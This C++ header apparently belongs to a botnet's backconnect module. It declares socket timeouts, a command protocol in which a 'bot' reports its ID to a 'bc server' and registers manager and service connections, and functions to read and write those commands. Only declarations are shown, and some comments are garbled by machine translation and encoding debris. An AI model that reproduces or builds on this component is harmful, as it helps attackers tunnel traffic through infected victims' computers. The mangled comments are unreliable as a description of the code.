/*
  Инструменты для Backconnect.
*/
#pragma once

namespace Backconnect
{
  //Nekotrye constants.
  enum
  {
    SOCKET_TIMEOUT     = 30 * 1000,     //Timeout for the socket.
    KEEPALIVE_DELAY    = 5 * 60 * 1000, //Keepalive.
    KEEPALIVE_INTERVAL = 5 * 1000       //Keepalive interval in case of error.
  };
  
  //Commands for BCCOMMAND.
  enum
  {
    COMMAND_UNKNOWN,    //Error.
    COMMAND_BOTID,      //Poslyetsya bot. Information after the structure is a string size
                        //wDataSize, carrying ID bot. Also soobshaet that this compound is
                        //manager.
    COMMAND_CONNECT,    //Poslyaetsya server. Create a new connection to the bc server. Carries
                        //DWORD itself as a unique ID for the connection.
    COMMAND_IS_SERVICE, //Poslyetsya bot. Soobshaet that this compound is a service,
                        //carries a DWORD received from COMMAND_CONNECT.
  };

  #pragma pack(push, 1)
  typedef struct
  {
    WORD structSize; //sizeof (COMMAND)
    WORD dataSize;   //Size of the data after idushih structure.
    BYTE command;    //Team
  }COMMAND;
  #pragma pack(pop)
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Чтение команды из сокета.

    IN s        - сокет.
    OUT command - структура для заполнения.
    OUT data    - буфер для данных, или NULL если данные не требуются. Буфер должен быть освобожден
                  через Mem.

    Return      - true  - в случаи успешного чтения команды.
                  false - в случаи оишбки.
  */
  bool _readCommand(SOCKET s, COMMAND *command, LPBYTE *data);

  /*В В В В Sending commands to a socket.

В В В В IN s - socket.
В В В В IN command - the command BCC_ *.
В В В В IN data - data.
В В В В IN dataSize - the size of the data.

В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize);
};
